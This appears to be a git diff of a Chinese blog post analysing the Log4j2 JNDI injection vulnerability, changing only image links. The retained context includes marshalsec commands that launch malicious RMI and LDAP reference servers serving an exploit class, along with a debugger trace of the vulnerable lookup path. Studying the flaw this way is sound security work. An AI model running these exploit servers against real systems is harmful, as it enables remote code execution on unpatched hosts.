@@ -112,7 +112,7 @@ public class test {
 
 比如 `${date}`
 
-![image-20250413161921428](https://bu.dusays.com/2025/04/13/67fb972fd294c.png)
+![image-20250413161921428](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424348.png)
 
 ## 漏洞分析
 
@@ -122,7 +122,7 @@ public class test {
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &#34;http://127.0.0.1:9999/#exp&#34; 9991
 ```
 
-![image-20250413163110389](https://bu.dusays.com/2025/04/13/67fb972fd67cf.png)
+![image-20250413163110389](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424362.png)
 
 ldap 也是这样
 
@@ -130,7 +130,7 @@ ldap 也是这样
 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#34;http://127.0.0.1:9999/#exp&#34; 1099
 ```
 
-![image-20250413163707776](https://bu.dusays.com/2025/04/13/67fb972fd9406.png)
+![image-20250413163707776](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424366.png)
 
 打个断点调试，来到 `org.apache.logging.log4j.core.layout.PatternLayout` 下的 `toSerializable` 方法
 
@@ -157,13 +157,13 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &#34;ht
 
 这个类就是将日志内容按 log4j2.xml 文件中规定好的格式那样输出，我们这里的格式为 `[%-5p] %d %c - %m%n` 所以第七次循环就会处理 `%m` 也就是我们的日志消息，会调用到 `org.apache.logging.log4j.core.pattern.MessagePatternConverter#format` 
 
-![image-20250413172119526](https://bu.dusays.com/2025/04/13/67fb972fed29c.png)
+![image-20250413172119526](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424358.png)
 
 这里的 `this.config` 就是我们实现log4j2的文件类型，这里是xml，`this.noLookups` 为 false 则代表启用 `${}` 变量替换，这里我们没有在xml中显式规定禁用，所以默认是启用的，而且我们这里本来就需要用到变量替换
 
 然后进入到 if 语句里面，如果检测到 `${` 开头，则取出从 `offset` 到当前 `workingBuilder` 末尾的内容，故这里 value 的值就为当时输入的值
 
-![image-20250413173023770](https://bu.dusays.com/2025/04/13/67fb972ff1426.png)
+![image-20250413173023770](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424355.png)
 
 然后调用 `replace()` ，又调用 `substitute()`，最后会调用到 `org.apache.logging.log4j.core.lookup.StrSubstitutor#resolveVariable`，这里的调用栈
 
@@ -194,7 +194,7 @@ resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup)
 
 最后调用到log4j2原生的 `lookup()` 方法
 
-![image-20250413180231646](https://bu.dusays.com/2025/04/13/67fb972fde156.png)
+![image-20250413180231646](https://6s6photo.oss-cn-chengdu.aliyuncs.com/20250625174424379.png)
 
 ## 绕过其防御
 
